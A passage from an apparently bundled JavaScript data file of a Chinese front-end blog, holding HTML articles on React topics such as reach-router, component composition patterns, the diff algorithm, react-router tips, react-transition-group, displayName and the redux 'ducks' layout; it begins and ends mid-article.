basuri:&#39;/a&#39;`</p>\\n<p>这个baseuri会作为<code>BaseContext</code>(React.createContext)的context传递给内部组件，最后使用<code>resolve</code>方法对Link上的to的路径(可能是绝对路径，也可能是相对路径)搭配<code>baseuri</code>进行解析(转换成绝对路径)，并且跳转</p>\\n<ul>\\n<li>自动focus</li>\\n</ul>\\n<p>对屏幕阅读器特别友好，每次通过Link跳转后，会自动focus到当前跳转对应的Component，也就是不需要再通过大量的tab按钮去寻找内容页面</p>\\n","toc":[{"anchor":"reachrouter","level":2,"text":"reach/router"}],"relatedTags":null,"created_at":"2018-07-08","timeArr":[2018,6,8,0,0,0,0],"title":"reach-router","uuid":"1478ca77fae5cf65527c2cf310fae0e530ea7496","summary":"<h4>reach/router</h4>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.reach-router/README.md\\">完整源码说明注释</a></p>\\n<p>一张导图：</p>\\n<p>![](/article/img/reachRoute...</p>","slug":"reach-router","sha":"a479afc7ac0daaf4863905d74229db3658f16354"}')},626:function(n){n.exports=JSON.parse('{"content":"<p>使用4种方式：props传递，父组件公用，hoc，render-prop</p>\\n<p>定义需求，cur符合auth才能查看组件内容，否则进入NotAccess</p>\\n<pre><code><pre class=\\"hljs\\"><code>const cur = &quot;a&quot;;\\nconst auth = {\\n  com1: [&quot;a&quot;, &quot;b&quot;],\\n  com2: [&quot;b&quot;, &quot;c&quot;],\\n  com3: [&quot;c&quot;, &quot;d&quot;]\\n};\\nconst NotAccess = () =&gt; &lt;div&gt;Not Access&lt;/div&gt;;</code></pre></code></pre><h2 id=\\"props-chuan-di\\">props传递</h2>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Component1 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> { comId } = props;\\n  <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n  <span class=\\"hljs-keyword\\">return</span> isValid ? &lt;div&gt;Component1&lt;/div&gt; : &lt;NotAccess /&gt;;\\n};\\n<span class=\\"hljs-keyword\\">const</span> Component2 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> { comId } = props;\\n  <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n  <span class=\\"hljs-keyword\\">return</span> isValid ? &lt;div&gt;Component2&lt;/div&gt; : &lt;NotAccess /&gt;;\\n};\\n<span class=\\"hljs-keyword\\">const</span> Component3 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> { comId } = props;\\n  <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n  <span class=\\"hljs-keyword\\">return</span> isValid ? &lt;div&gt;Component3&lt;/div&gt; : &lt;NotAccess /&gt;;\\n};\\n\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;\\n        &lt;Component1 comId={\\"com1\\"} /&gt;\\n        &lt;Component2 comId={\\"com2\\"} /&gt;\\n        &lt;Component3 comId={\\"com3\\"} /&gt;\\n      &lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p><a href=\\"https://codesandbox.io/s/04nxrzzm1v\\">在线例子</a></p>\\n<h2 id=\\"zu-jian-fu-yong-children\\">组件复用+Children</h2>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Component1 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component1&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component2 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component2&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component3 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component3&lt;/div&gt;;\\n\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">AuthComponent</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">const</span> { comId } = <span class=\\"hljs-keyword\\">this</span>.props;\\n    <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n    <span class=\\"hljs-keyword\\">return</span> isValid ? <span class=\\"hljs-keyword\\">this</span>.props.children : &lt;NotAccess /&gt;;\\n  }\\n}\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;\\n        &lt;AuthComponent comId={\\"com1\\"}&gt;\\n          &lt;Component1 /&gt;\\n        &lt;/AuthComponent&gt;\\n        &lt;AuthComponent comId={\\"com2\\"}&gt;\\n          &lt;Component2 /&gt;\\n        &lt;/AuthComponent&gt;\\n        &lt;AuthComponent comId={\\"com3\\"}&gt;\\n          &lt;Component3 /&gt;\\n        &lt;/AuthComponent&gt;\\n      &lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p><a href=\\"https://codesandbox.io/s/zvo23629m\\">在线例子</a></p>\\n<h2 id=\\"gao-jie-zu-jian--hoc\\">高阶组件 HOC</h2>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Component1 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component1&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component2 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component2&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component3 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component3&lt;/div&gt;;\\n\\n<span class=\\"hljs-keyword\\">const</span> Auth = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">Component, comId</span>) =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n    render() {\\n      <span class=\\"hljs-keyword\\">const</span> isValid = auth[comId].includes(cur);\\n      <span class=\\"hljs-keyword\\">return</span> isValid ? &lt;Component /&gt; : &lt;NotAccess /&gt;;\\n    }\\n  };\\n};\\n\\n<span class=\\"hljs-keyword\\">let</span> AuthCom1 = Auth(Component1, <span class=\\"hljs-string\\">\\"com1\\"</span>);\\n<span class=\\"hljs-keyword\\">let</span> AuthCom2 = Auth(Component2, <span class=\\"hljs-string\\">\\"com2\\"</span>);\\n<span class=\\"hljs-keyword\\">let</span> AuthCom3 = Auth(Component3, <span class=\\"hljs-string\\">\\"com3\\"</span>);\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;div&gt;\\n        &lt;AuthCom1 /&gt;\\n        &lt;AuthCom2 /&gt;\\n        &lt;AuthCom3 /&gt;\\n      &lt;/div&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p><a href=\\"https://codesandbox.io/s/9oz40znmvy\\">在线例子</a></p>\\n<h2 id=\\"render-prop\\">render-prop</h2>\\n<p>App组件可以轻松的获取任何子组件里的参数</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> Component1 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component1&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component2 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component2&lt;/div&gt;;\\n<span class=\\"hljs-keyword\\">const</span> Component3 = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> &lt;div&gt;Component3&lt;/div&gt;;\\n\\n<span class=\\"hljs-keyword\\">const</span> AuthCom = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">props</span> =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">const</span> validEles = React.Children.map(props.children, e =&gt; {\\n    <span class=\\"hljs-keyword\\">const</span> { comId } = e.props;\\n    <span class=\\"hljs-keyword\\">return</span> auth[comId].includes(cur) ? e : &lt;NotAccess /&gt;;\\n  });\\n  <span class=\\"hljs-keyword\\">return</span> props.render(validEles);\\n};\\n\\n<span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">App</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n  render() {\\n    <span class=\\"hljs-keyword\\">return</span> (\\n      &lt;AuthCom\\n        render={validEles =&gt; {\\n          return validEles.map(e =&gt; e);\\n        }}\\n      &gt;\\n        &lt;Component1 comId=\\"com1\\" /&gt;\\n        &lt;Component2 comId=\\"com2\\" /&gt;\\n        &lt;Component3 comId=\\"com3\\" /&gt;\\n      &lt;/AuthCom&gt;\\n    );\\n  }\\n}</code></pre></code></pre>\\n<p><a href=\\"https://codesandbox.io/s/l27ljm781q\\">在线例子</a></p>\\n","toc":[{"anchor":"props-chuan-di","level":2,"text":"props传递"},{"anchor":"zu-jian-fu-yong-children","level":2,"text":"组件复用+Children"},{"anchor":"gao-jie-zu-jian--hoc","level":2,"text":"高阶组件 HOC"},{"anchor":"render-prop","level":2,"text":"render-prop"}],"relatedTags":null,"created_at":"2018-08-04","timeArr":[2018,7,4,0,0,0,0],"title":"react的编写模式","uuid":"6fd675137d4fc7c9017a5d49e6617b15a17ace30","summary":"<p>使用4种方式：props传递，父组件公用，hoc，render-prop</p>\\n<p>定义需求，cur符合auth才能查看组件内容，否则进入NotAccess</p>\\n<pre class=\\"hljs\\"><code>const cur = &quot;a&quot;;\\nconst auth = {\\n  com1: [&quot;a&quot;, &quot;b&quot;],\\n  com2: [&quot;b&quot;, &quot;c&quot;],\\n  com3: [...</code></pre>","slug":"react-de-bian-xie-mo-shi","sha":"ac63fa5d204d619196b3d6c6134d623fb670d2f1"}')},627:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"diff-suan-fa-3-ge-ce-lve\\">Diff算法3个策略</h4>\\n<ol>\\n<li>跨层级不进行不比较</li>\\n<li>不同类不进行比较</li>\\n<li>同类同级通过key比较</li>\\n</ol>\\n<p>主要对第三种进行解释</p>\\n<h2 id=\\"li-zi\\">例子</h2>\\n<p>更新前组件：<code>A-B-C-D</code> =&gt; 更新后组件：<code>C-B-E-A</code></p>\\n<p>满足<code>child._mountIndex &lt; lastIndex</code>才会进行组件移动</p>\\n<ul>\\n<li><p><code>child._mountIndex</code>其实是当前的index，但此时正在比较，还未变动，也就是更新前的index</p>\\n</li>\\n<li><p><code>lastIndex</code>是一个不断更新的值，每一个组件比较后，lastIndex为<code>Math.max(prevChild.mountIndex,lastIndex)</code></p>\\n</li>\\n</ul>\\n<p>遍历新集合：</p>\\n<p>比较C：<code>child._mountIndex</code>为2，<code>lastIndex</code>为0,不满足，不执行变动，更新<code>lastIndex</code>为2；</p>\\n<p>比较B：<code>child._mountIndex</code>为1，<code>lastIndex</code>为2，满足，执行移动，更新<code>lastIndex</code>为2；</p>\\n<p>比较E：旧集合未找到，执行添加，<code>lastIndex</code>为2；</p>\\n<p>比较A：<code>child._mountIndex</code>为0，<code>lastIndex</code>为2，满足，执行移动，更新<code>lastIndex</code>为2；</p>\\n<p>遍历旧集合，发现D，执行删除</p>\\n<h2 id=\\"que-dian\\">缺点</h2>\\n<p>从上面例子可以发现，diff算法主要通过不断更新<code>lastIndex</code>进行判断，因此，\\n如果<code>lastIndex</code>一开始就更新成最后一个index，那么后面的所有组件都要进行变动。</p>\\n<p>例如：</p>\\n<p>更新前组件：<code>A-B-C-D</code> =&gt; 更新后组件：<code>D-A-B-C</code></p>\\n<p>一开始比较D：<code>child._mountIndex</code>为3，<code>lastIndex</code>为0,不满足，不执行变动，更新<code>lastIndex</code>为3；</p>\\n<p>此时<code>lastIndex</code>已经为最大值，后面所有比较都会满足<code>child._mountIndex &lt; lastIndex</code></p>\\n<p>更新变动为：</p>\\n<p>D组件不变</p>\\n<p>A,B,C组件都要移动</p>\\n","toc":[{"anchor":"diff-suan-fa-3-ge-ce-lve","level":4,"text":"Diff算法3个策略"},{"anchor":"li-zi","level":2,"text":"例子"},{"anchor":"que-dian","level":2,"text":"缺点"}],"relatedTags":null,"created_at":"2018-06-21","timeArr":[2018,5,21,0,0,0,0],"title":"react-diff","uuid":"a7eefe5d3d4ed07619a790048edf4b9617f40957","summary":"<h4>Diff算法3个策略</h4>\\n<ol>\\n<li>跨层级不进行不比较</li>\\n<li>不同类不进行比较</li>\\n<li>同类同级通过key比较</li>\\n</ol>\\n<p>主要对第三种进行解释</p>\\n<h4>例子</h4>\\n<p>更新前组件：<code>A-B-C-D</code> =&gt; 更新后组件：<code>C-B-E-A</code></p>\\n<p>满足<code>child._mountIndex &lt; lastIndex</code>才会进行组件移动</p>\\n<ul>\\n<li>`...</li>\\n</ul>","slug":"react-diff","sha":"815f451f91044acdeba648889b432803b50a1130"}')},628:function(n){n.exports=JSON.parse('{"content":"<ol>\\n<li><code>SPA</code>的router跳转后立刻回到最顶端</li>\\n</ol>\\n<p>核心：添加<code>window.scrollTo(0, 0)</code></p>\\n<p>可以在每一个<code>Component</code>里面写，也可以包裹<code>Route</code></p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">ScrollToTopRoute</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  componentDidUpdate(prevProps) {\\n    <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-keyword\\">this</span>.props.location.pathname !== prevProps.location.pathname){\\n      <span class=\\"hljs-built_in\\">window</span>.scrollTo(<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>);\\n    }\\n  }\\n  render() {\\n    <span class=\\"hljs-keyword\\">const</span> { <span class=\\"hljs-attr\\">component</span>: Component, ...rest } = <span class=\\"hljs-keyword\\">this</span>.props;\\n    <span class=\\"hljs-keyword\\">return</span> &lt;Route {...rest} render={props =&gt; (&lt;Component {...props} /&gt;)} /&gt;;\\n  }\\n}</code></pre></code></pre>\\n<ol start=\\"2\\">\\n<li>当url的search发生变化，router不未发生更新，因为页面并未改变</li>\\n</ol>\\n<p>例如：<code>http://xx.xx.com/search/</code>===&gt;<code>http://xx.xx.com/search/?id=5</code></p>\\n<p>核心：通过给<code>Component</code>设置<code>key</code>，当key不同时，让Component强制更新</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">ScrollToTopRoute</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  componentDidUpdate(prevProps) {\\n    <span class=\\"hljs-keyword\\">if</span>(<span class=\\"hljs-keyword\\">this</span>.props.location.pathname !== prevProps.location.pathname){\\n      <span class=\\"hljs-built_in\\">window</span>.scrollTo(<span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-number\\">0</span>);\\n    }\\n  }\\n  render() {\\n    <span class=\\"hljs-keyword\\">const</span> { <span class=\\"hljs-attr\\">component</span>: Component, RouteKey, location, ...rest } = <span class=\\"hljs-keyword\\">this</span>.props;\\n    <span class=\\"hljs-keyword\\">const</span> Key = RouteKey ? location.pathname + location.search : <span class=\\"hljs-literal\\">null</span>;\\n    <span class=\\"hljs-keyword\\">return</span> &lt;Route {...rest} render={props =&gt; (&lt;Component {...props} key={Key} /&gt;)} /&gt;;\\n  }\\n}\\n\\n<span class=\\"hljs-comment\\">// Usage</span>\\n&lt;Router history={History}&gt;\\n  &lt;Switch&gt;\\n    &lt;ScrollToTopRoute exact path=\\"/\\" component={Home}/&gt;\\n    &lt;ScrollToTopRoute exact path=\\"/search\\" component={Search} RouteKey={true} /&gt;\\n  &lt;/Switch&gt;\\n&lt;<span class=\\"hljs-regexp\\">/Router&gt;</span></code></pre></code></pre>\\n<p>参考：<a href=\\"https://blog.bitsrc.io/the-love-hate-relationship-between-react-router-and-react-components-dee4aac5956c\\">The Love-Hate Relationship between React Router and React Components</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-06","timeArr":[2018,10,6,0,0,0,0],"title":"react-router2个技巧","uuid":"8f280c8e1286471ef7f34acf52ea54212de93568","summary":"<ol>\\n<li><code>SPA</code>的router跳转后立刻回到最顶端</li>\\n</ol>\\n<p>核心：添加<code>window.scrollTo(0, 0)</code></p>\\n<p>可以在每一个<code>Component</code>里面写，也可以包裹<code>Route</code></p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">ScrollToTopRoute</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">Component</span> </span>{\\n  componen...</code></pre>","slug":"react-router2-ge-ji-qiao","sha":"557c27da0f9f9270e3a273c2f21a0885dca67e10"}')},629:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"reacttransitiongroup\\">ReactTransitionGroup</h4>\\n<h4 id=\\"transition\\">Transition</h4>\\n<p>默认展示组件某个特定状态的样式，而不是创建渐变动画</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;Transition\\n        <span class=\\"hljs-keyword\\">in</span>={toggleShow}\\n        timeout={<span class=\\"hljs-number\\">1000</span>}\\n        unmountOnExit\\n        &gt;\\n    {state=&gt;(\\n        &lt;div&gt;{state}&lt;/div&gt;\\n    )}\\n&lt;<span class=\\"hljs-regexp\\">/Transition&gt;</span></code></pre></code></pre>\\n<p>注意：子组件是函数（见下方children）</p>\\n<h2 id=\\"csstransition\\">CSSTransition</h2>\\n<p>展示组件从状态到另一个状态的动态变化，需要定义className和相关样式</p>\\n<p>例如：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;CSSTransition \\n        <span class=\\"hljs-keyword\\">in</span>={toggleShow}\\n        className=<span class=\\"hljs-string\\">\\"fade\\"</span>\\n        timeout={<span class=\\"hljs-number\\">300</span>}\\n        &gt;\\n    <span class=\\"hljs-comment\\">//子组件（需要动画的组件）</span>\\n&lt;<span class=\\"hljs-regexp\\">/CSSTransition&gt;</span></code></pre></code></pre>\\n<p>css中设置如下：</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>.fade-enter {\\n  opacity: 0.01;\\n}\\n.fade-enter-active {\\n  opacity: 1;\\n  transition: opacity 300ms;\\n}\\n.fade-exit {\\n  opacity: 1;\\n}\\n.fade-exit-active {\\n  opacity: 0.01;\\n  transition: opacity 300ms;\\n}</code></pre></code></pre>\\n<h4 id=\\"transitiongroup\\">TransitionGroup</h4>\\n<p>管理一些列组件的动画，例如列表</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;ul&gt;\\n  &lt;TransitionGroup&gt;\\n    {items.map(({ id, text }) =&gt; (\\n      &lt;CSSTransition\\n        key={id}\\n        timeout={500}\\n        classNames=\\"fade\\"\\n      &gt;\\n        &lt;li&gt;{text}&lt;/li&gt;\\n      &lt;/CSSTransition&gt;\\n    ))}\\n  &lt;/TransitionGroup&gt;\\n&lt;<span class=\\"hljs-regexp\\">/ul&gt;</span></code></pre></code></pre>\\n<h4 id=\\"chang-yong-shu-xing\\">常用属性</h4>\\n<ul>\\n<li>children</li>\\n</ul>\\n<p>当children是一个函数时，接受一个参数state，state包含了内部组件的transition状态\\n<code>&#39;entering&#39;, &#39;entered&#39;, &#39;exiting&#39;, &#39;exited&#39;, &#39;unmounted&#39;</code></p>\\n<ul>\\n<li>in</li>\\n</ul>\\n<p>定义当前组件的状态(true为entered，false为exited)</p>\\n<ul>\\n<li>unmountOnExit </li>\\n</ul>\\n<p>当状态为exited的时候是否需要unmount</p>\\n<ul>\\n<li>timeout </li>\\n</ul>\\n<p>定义transition间隔，可以这么写：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>timeout={{\\n  <span class=\\"hljs-attr\\">enter</span>:<span class=\\"hljs-number\\">300</span>,\\n  <span class=\\"hljs-attr\\">exit</span>:<span class=\\"hljs-number\\">300</span>\\n}}</code></pre></code></pre>\\n","toc":[{"anchor":"reacttransitiongroup","level":4,"text":"ReactTransitionGroup"},{"anchor":"transition","level":4,"text":"Transition"},{"anchor":"csstransition","level":2,"text":"CSSTransition"},{"anchor":"transitiongroup","level":4,"text":"TransitionGroup"},{"anchor":"chang-yong-shu-xing","level":4,"text":"常用属性"}],"relatedTags":null,"created_at":"2018-06-20","timeArr":[2018,5,20,0,0,0,0],"title":"react-transition-group","uuid":"a016c3917edd52dc61593c47a19f112ce3e57081","summary":"<h4>ReactTransitionGroup</h4>\\n<h4>Transition</h4>\\n<p>默认展示组件某个特定状态的样式，而不是创建渐变动画</p>\\n<p>例如：</p>\\n<pre class=\\"hljs\\"><code>&lt;Transition\\n        <span class=\\"hljs-keyword\\">in</span>={toggleShow}\\n        timeout={<span class=\\"hljs-number\\">1000</span>}\\n        unmountOnEx...</code></pre>","slug":"react-transition-group","sha":"2c184a72cccb6e8c5cb04541f46eb06b15533efa"}')},630:function(n){n.exports=JSON.parse('{"content":"<p><code>displayName</code>定义调试时的组件name，例如：</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">withHOC</span>(<span class=\\"hljs-params\\">WrapComponent</span>) </span>{\\n   <span class=\\"hljs-comment\\">// 此处未定义名称或者希望动态定义名称</span>\\n   <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n     <span class=\\"hljs-comment\\">// 定义displayName</span>\\n     <span class=\\"hljs-keyword\\">static</span> displayName = <span class=\\"hljs-string\\">`withHOC(<span class=\\"hljs-subst\\">${WrapComponent.displayName || WrapComponent.name}</span>)`</span>;\\n     render(){\\n       <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"inside HOC\\"</span>)\\n       <span class=\\"hljs-keyword\\">return</span> &lt;WrapComponent {...this.props } /&gt;;\\n     }\\n   }\\n }\\n\\n App = withHOC(App);</code></pre></code></pre>\\n<p>如果未定义displayName，那么进行调试的时候，就会显示如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code>// react自动定义名称\\n|---_class2\\n  |---App\\n    ...</code></pre></code></pre><p>定义displayName后，显示如下：</p>\\n<pre><code><pre class=\\"hljs\\"><code>|---withHOC(App)\\n  |---App\\n    ...</code></pre></code></pre>","toc":[],"relatedTags":null,"created_at":"2018-06-16","timeArr":[2018,5,16,0,0,0,0],"title":"reactComponent.displayName","uuid":"518351f05dc93d811b1d88f9c35718525adb0e07","summary":"<p><code>displayName</code>定义调试时的组件name，例如：</p>\\n<pre class=\\"hljs\\"><code> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">withHOC</span>(<span class=\\"hljs-params\\">WrapComponent</span>) </span>{\\n   <span class=\\"hljs-comment\\">// 此处未定义名称或者希望动态定义名称</span>\\n   <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n     <span class=\\"hljs-comment\\">// 定义displayName</span>\\n...</code></pre>","slug":"reactComponent.displayName","sha":"fde82993f585c209a25f00c57ea4fb1713626d27"}')},631:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>之前的项目架构写法<pre><code><pre class=\\"hljs\\"><code>product/\\n├── product.js\\n├── constant.js\\n├── productActions.js\\n├── productReducers.js\\n...\\nwidget/\\n├── widget.js\\n├── constant.js\\n├── widgetActions.js\\n├── widgetReducers.js\\n...\\nlogin/\\n├── login.js\\n├── constant.js\\n├── loginActions.js\\n├── reducers.js\\n  ├──index.js\\n  ├──someReducer2.js\\n  ├──someReducer1.js\\n          ...\\n...\\ngallery/\\n├── gallery.js\\n├── constant.js\\n├── action/\\n  ├──someAction1.js\\n  ├──someAction2.js\\n          ...\\n├── galleryReducers.js\\n...</code></pre></code></pre>除了这种类似按功能划分，还有其他，例如dump/smart component等</li>\\n</ul>\\n<p>这些有一个特点，划分的很细，而且很抽象，基本上面对任何功能，都是同一套模板，但你也有可能面对一个简单的逻辑，确去查找了4-5个文件</p>\\n<h2 id=\\"ya-zi-lei-xing-de-xie-fa\\">鸭子类型的写法</h2>\\n<pre><code><pre class=\\"hljs\\"><code>duck/\\n├── product.js\\n├── login.js\\n├── gallery.js\\n├── widget.js\\n...</code></pre></code></pre><p>就是将每个功能板块的action,reducer等合并到一起，但需要遵守几个规则：</p>\\n<ol>\\n<li>必须 export default 函数名为 reducer() 的 reducer</li>\\n<li>必须 作为函数 export 它的 action creators</li>\\n<li>必须 把 action types 定义成形为 npm-module-or-app/reducer/ACTION_TYPE 的字符串</li>\\n<li>如果有外部的reducer需要监听这个action type，或者作为可重用的库发布时， 可以 用 UPPER_SNAKE_CASE 形式 export 它的 action types。</li>\\n</ol>\\n<p>其中第三条是必须规定这么写type</p>\\n<p><code>const LOAD   = &#39;my-app/widgets/LOAD&#39;</code></p>\\n<p>以路径的方式定义type</p>\\n<p>至于原因还不太理解，可能是当应用复杂的时候也能正确区分每一个type，而且路径命名比较好找？</p>\\n<p>当遵守了以上规则，其duck内部文件内容就有点类似金字塔形状了，</p>\\n<pre><code><pre class=\\"hljs\\"><code>├──product.js (export default combineReducer(...))\\n\\n             combineReducer\\n                   |    \\n             reducer reducer\\n            /      |       \\\\\\n        action action action action\\n        /          |           \\\\\\n    type type type type type type type type\\n</code></pre></code></pre><p>这种结构当我们针对某个功能进行阅读或者修改，确实方便（都在一个文件内部），性能也相对会提升（不会那么多调用）</p>\\n<p>但是个人认为项目大到一定程度，某个功能的文件内容多到一定程度，还是需要分割，或许可以写成：</p>\\n<pre><code><pre class=\\"hljs\\"><code>duck/\\n├── product\\n    ├── productActions.js\\n    ├── productReducers.js\\n    ├── productTypes.js\\n├── login.js\\n├── gallery.js\\n├── widget.js\\n...</code></pre></code></pre><p>这种混合模式可能比较适合。</p>\\n","toc":[{"anchor":"ya-zi-lei-xing-de-xie-fa","level":2,"text":"鸭子类型的写法"}],"relatedTags":null,"created_at":"2018-06-15","timeArr":[2018,5,15,0,0,0,0],"title":"redux的鸭子类型","uuid":"4a83e73cdbfb044bbcaeec9d58a931ead5069ff7","summary":"<ul>\\n<li>之前的项目架构写法</li>\\n</ul>\\n<pre class=\\"hljs\\"><code>product/\\n├── product.js\\n├── constant.js\\n├── productActions.js\\n├── productReducers.js\\n...\\nwidget/\\n├── widget.js\\n├── constant.js\\n├── widgetActions...</code></pre>","slug":"redux-de-ya-zi-lei-xing","sha":"fb8d734075bef018a7449f06ddd06ffbb203848f"}')},632:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"yi\\">一</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> pingEpic = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action$</span> =&gt;</span>\\n  action$.filter(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> action.type === <span class=\\"hljs-string\\">\'PING\'</span>)\\n    .mapTo({ <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'PONG\'</span> });</code></pre></code></pre>\\n<blockquote>\\n<p>pingEpic 会监听类型为 PING 的 actions，然后投射为新的 action，PONG。这个例子功能上相当于做了这件事情:</p>\\n</blockquote>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>dispatch({ <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'PING\'</span> });\\ndispatch({ <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'PONG\'</span> });</code></pre></code></pre>\\n<blockquote>\\n<p>牢记: Epics 运行在正常分发渠道旁, 在 reducers 完全接受到它们之后。当你将一个 action 投射成另一个 action，\\n你不会 